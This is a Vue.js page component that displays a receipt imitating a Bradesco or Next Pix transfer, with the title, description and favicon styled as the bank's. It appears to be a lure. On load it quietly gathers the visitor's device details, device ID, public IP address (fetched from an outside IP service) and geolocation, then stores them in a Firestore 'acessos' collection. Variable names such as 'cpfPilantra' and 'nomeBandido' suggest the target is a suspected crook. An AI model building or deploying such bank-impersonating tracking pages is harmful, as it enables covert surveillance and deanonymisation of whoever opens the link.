<template>
    <div class="container">
        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante" />
        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante" />
    </div>
</template>

<script setup>
import { computed, onBeforeMount, onMounted, ref } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { firestore } from '../firebase';
import { collection, doc, getDoc, serverTimestamp, setDoc } from 'firebase/firestore';
import { useAppStore } from '../store';
import { bancoInfo, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome } from '../functions';
import Bradesco from '../components/ComprovanteBradesco.vue';
import Next from '../components/ComprovanteNext.vue';
import { Device } from '@capacitor/device';

const route = useRoute();
const router = useRouter();

const appStore = useAppStore();

const comprovante = ref(null);
const acesso = ref({});
const acessoId = ref(null);

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    if (!route.query.id) {
        router.push({ path: '/' });
    }

    const docRef = doc(firestore, 'comprovantes', route.query.id);
    const docSnap = await getDoc(docRef);

    if (!docSnap.exists()) {
        router.push({ path: '/' });
    }

    comprovante.value = docSnap.data();
    comprovante.value.dataHora = formataDataHoraPtBr(comprovante.value.dataHora.toDate());
    comprovante.value.bancoImgSrc = bancoImgSrc.value;
    comprovante.value.transacao = route.query.id;

    if (!bancoInfo(comprovante.value.instituicao)) {
        router.push({ path: '/' });
    }

    setMetaData();

    try {
        acesso.value = { ...acesso.value, ...await Device.getInfo() };
    } catch (error) {
        console.error('Error device info:', error);
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        acesso.value.publicIp = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    // PEGA AS COORDENADAS DA LOCALIZAÇÃO
    const position = await getCurrentPosition();
    acesso.value = { ...acesso.value, ...position };

    acesso.value.at = serverTimestamp();
    acesso.value.deviceId = (await Device.getId()).identifier;
    acesso.value.comprovanteId = comprovante.value.transacao;

    Object.keys(acesso.value).forEach(key => acesso.value[key] === undefined && delete acesso.value[key]);

    try {
        const ref = doc(collection(firestore, "acessos"));
        await setDoc(ref, acesso.value);
        acessoId.value = ref.id;
    } catch (error) {
        console.error('Error ao enviar acesso:', error);
    }

    appStore.loadingToggle();
});

const bancoImgSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}.jpg`, import.meta.url).href
});

const faviconSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}-favicon.png`, import.meta.url).href
});
function setMetaData() {
    const banco = bancoInfo(comprovante.value.instituicao);

    document.title = `${banco.nomeResumido} - Pix ${formataMoedaBRL(comprovante.value.valor)} de ${pegaPrimeiroNome(comprovante.value.nomePagador)}`;

    let docBandido = '';
    let nomeBandido = '';

    if (comprovante.value.cpfPilantra) {
        docBandido = maskCpf(comprovante.value.cpfPilantra);
    } else if (comprovante.value.cnpjPilantra) {
        docBandido = comprovante.value.cnpjPilantra;
    }

    if (comprovante.value.nomePilantra) {
        nomeBandido += pegaPrimeiroNome(comprovante.value.nomePilantra);
    }

    let para = '';

    if (docBandido && nomeBandido) {
        para += ` para ${docBandido} - ${nomeBandido}`;
    } else if (docBandido || nomeBandido) {
        para += ` para ${docBandido + nomeBandido}`
    }

    document
        .getElementsByTagName('meta')
        .namedItem('description')
        .setAttribute('content', `Comprovante ${banco.nome}: Transação no valor de ${formataMoedaBRL(comprovante.value.valor)}${para}.`);

    document.querySelector('link[rel="image_src"]').href = bancoImgSrc.value;
    document.querySelector('link[rel="icon"]').href = faviconSrc.value;
}
</script>